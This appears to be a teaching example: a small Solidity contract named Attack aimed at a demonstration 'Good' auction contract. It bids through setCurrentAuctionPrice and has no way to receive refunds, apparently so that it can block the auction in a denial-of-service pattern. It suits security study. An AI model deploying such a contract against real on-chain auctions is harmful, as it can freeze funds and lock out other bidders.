// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./Good.sol";

contract Attack {
    Good s_good;

    constructor(address _good) {
        s_good = Good(_good);
    }

    function attack() public payable {
        s_good.setCurrentAuctionPrice{value: msg.value}();
    }
}
